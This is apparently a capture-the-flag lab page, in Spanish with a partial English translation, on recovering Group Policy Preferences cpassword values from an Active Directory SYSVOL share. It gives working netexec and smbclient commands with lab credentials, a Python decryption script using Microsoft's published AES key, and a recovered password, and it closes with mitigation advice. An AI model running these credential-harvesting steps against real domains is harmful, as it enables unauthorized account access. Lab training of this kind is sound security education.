Objetivo

El recurso SYSVOL guarda una GPO de despliegue con el atributo cpassword. Descífralo con la clave AES que Microsoft publicó (MS14-025) y usa la contraseña obtenida para leer //DC01/deploy.

Flag: //{{ ad_dc_host }}/deploy/flag-ad-06.txt — captúrala en el Domain Controller y valídala en la barra lateral.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Buscar cpassword en SYSVOL automáticamente (busca y descifra)
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M gpp_password

# Descifrar a mano
gpp-decrypt '<cpassword>'

1 · Por qué funciona

Las Group Policy Preferences permitían distribuir contraseñas (usuarios locales, unidades mapeadas, tareas programadas). Se guardaban en ficheros XML dentro de SYSVOL, cifradas con AES-256… pero Microsoft publicó la clave en MSDN. Cualquier usuario del dominio puede leer SYSVOL, así que cualquiera puede descifrarlas. Se parcheó en MS14-025, pero los XML antiguos siguen ahí en muchísimos dominios.

2 · Recorrer SYSVOL en busca de XML

Importante: mget *.xml con un filtro de extensión no baja a subcarpetas aunque tengas recurse ON — es una limitación conocida de smbclient (el glob solo mira el directorio actual). Los XML de GPP están varios niveles por debajo de Policies\ (dentro de cada GUID de GPO, en Machine\Preferences\Groups\ o similar), así que con un patrón concreto no encuentras nada. La solución es usar mget * sin filtro — ese sí recorre subcarpetas de verdad y conserva la estructura de directorios en local:

smbclient //{{ ad_dc_ip }}/sysvol -U '{{ ad_domain }}\svc.readonly%ReadOnly123!'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd {{ ad_realm_lower }}\Policies\
smb: \> mget *
smb: \> exit

find . -iname "*.xml"
# ./{A2B3C4D5-1E6F-4A7B-8C9D-0E1F2A3B4C5D}/Machine/Preferences/Groups/Groups.xml

Los ficheros interesantes son Groups.xml, Services.xml, ScheduledTasks.xml, Drives.xml y DataSources.xml.

Con netexec, el flag --spider --pattern necesita --content para buscar dentro del contenido de los ficheros (sin él no busca en el contenido y no encuentra nada). Además, --spider no descarga ni guarda nada en tu Kali — solo imprime en pantalla la ruta remota del fichero donde aparece la coincidencia:

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' \
  --spider sysvol --content --pattern 'cpassword'
# //{{ ad_dc_ip }}/sysvol/{{ ad_realm_lower }}/Policies/{A2B3C4D5-.../Machine/Preferences/Groups/Groups.xml [...pattern:'cpassword']

Esa ruta es la ruta remota en el DC, no un fichero en tu equipo. Para tener una copia local, descárgalo aparte con smbclient (como en el paso anterior) o usa el módulo spider_plus, que sí descarga automáticamente todo lo que encuentra en los shares legibles a ~/.nxc/modules/nxc_spider_plus/<IP>/<share>/... (y guarda un índice en ~/.nxc/modules/nxc_spider_plus/<IP>.json):

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M spider_plus -o DOWNLOAD_FLAG=True

ls ~/.nxc/modules/nxc_spider_plus/{{ ad_dc_ip }}/sysvol/{{ ad_realm_lower }}/Policies/*/Machine/Preferences/Groups/

4 · Descifrarlo

# Todo automático (busca en SYSVOL y descifra)
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M gpp_password

Salida: GPPstillStandingStrong2k18

La clave AES pública, por si quieres hacerlo tú mismo:

4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b

python3 -c "
from Crypto.Cipher import AES
import base64
key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
b = 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
b += '=' * ((4 - len(b) % 4) % 4)
d = AES.new(key, AES.MODE_CBC, b'\x00'*16).decrypt(base64.b64decode(b))
print(d[:-d[-1]].decode('utf-16-le'))
"

Mitigación

  • Aplicar MS14-025 y borrar los XML antiguos de SYSVOL (el parche solo impide crear nuevos).
  • Buscar de forma recurrente cpassword en SYSVOL y rotar cualquier contraseña encontrada.
  • Usar LAPS para las contraseñas de administrador local en lugar de GPP.

Herramientas

gpp-decrypt netexec (nxc) smbclient Get-GPPPassword

1 · Why it works

Group Policy Preferences used to distribute passwords (local users, mapped drives, scheduled tasks). They were stored in XML files inside SYSVOL, encrypted with AES-256… except Microsoft published the key on MSDN. Every domain user can read SYSVOL, so every domain user can decrypt them. Fixed in MS14-025, but the legacy XML files are still sitting there in a huge number of domains.

2 · Crawl SYSVOL looking for XML files

Important: mget *.xml with an extension filter does not descend into subfolders even with recurse ON — a known smbclient limitation (the glob only matches the current directory). The GPP XML files sit several levels below Policies\ (inside each GPO's GUID folder, under Machine\Preferences\Groups\ or similar), so a specific pattern finds nothing. The fix is to use mget * with no filter — that one genuinely recurses and keeps the directory structure locally:

smbclient //{{ ad_dc_ip }}/sysvol -U '{{ ad_domain }}\svc.readonly%ReadOnly123!'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd {{ ad_realm_lower }}\Policies\
smb: \> mget *
smb: \> exit

find . -iname "*.xml"
# ./{A2B3C4D5-1E6F-4A7B-8C9D-0E1F2A3B4C5D}/Machine/Preferences/Groups/Groups.xml

The interesting files are Groups.xml, Services.xml, ScheduledTasks.xml, Drives.xml and DataSources.xml.

With netexec, the --spider --pattern flag needs --content to actually search inside file content (without it, it doesn't search content at all and finds nothing). Also, --spider does not download or save anything on your Kali — it only prints the remote path of the matching file to the screen:

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' \
  --spider sysvol --content --pattern 'cpassword'
# //{{ ad_dc_ip }}/sysvol/{{ ad_realm_lower }}/Policies/{A2B3C4D5-.../Machine/Preferences/Groups/Groups.xml [...pattern:'cpassword']

That path is the remote path on the DC, not a file on your machine. To get a local copy, download it separately with smbclient (as in the step above) or use the spider_plus module, which does auto-download everything it finds on readable shares to ~/.nxc/modules/nxc_spider_plus/<IP>/<share>/... (and saves an index at ~/.nxc/modules/nxc_spider_plus/<IP>.json):

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M spider_plus -o DOWNLOAD_FLAG=True

ls ~/.nxc/modules/nxc_spider_plus/{{ ad_dc_ip }}/sysvol/{{ ad_realm_lower }}/Policies/*/Machine/Preferences/Groups/
